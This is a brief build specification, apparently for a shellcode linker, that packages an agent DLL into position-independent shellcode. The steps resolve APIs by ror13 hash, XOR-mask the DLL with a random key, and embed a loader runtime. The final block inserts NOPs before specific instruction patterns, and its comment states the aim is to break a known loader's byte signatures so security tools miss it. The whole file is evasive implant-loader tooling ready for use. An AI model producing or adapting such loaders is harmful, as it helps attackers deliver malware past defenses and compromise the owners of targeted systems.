# AB Kit Loader — PIC entry that bootstraps the PICO runtime and loads the agent DLL.
#
# Build: cpl link loader.spec <agent.dll> <output.bin>
#
# Flow:
#   1. Load loader.o as PIC, merge services.o for API resolution
#   2. XOR-mask the DLL with a random key
#   3. Build the PICO runtime (pico.spec) and embed it
#   4. Export the final shellcode blob
x64:
    load "bin/loader.x64.o"
        make pic +gofirst +shatter +mutate

    load "bin/services.x64.o"
        merge

    load "bin/load_phantom.x64.o"
        merge

    dfr "resolve" "ror13"
    mergelib "libtcg.x64.zip"

    # XOR-mask the agent DLL with a random 128-byte key
    generate $MASK 128

    push $DLL
        xor $MASK
        preplen
        link "dll"

    push $MASK
        preplen
        link "mask"

    # Build and embed the PICO runtime
    run "pico.spec"
        link "pico"

    # Break CristalLoaders prologue/epilogue byte signatures
    pack $NOP "b" 0x90
    ised insert "PUSH r64" "SUB r/m64, imm8" $NOP +before
    ised insert "POP r64"  "CALL r/m64"      $NOP +before

    export
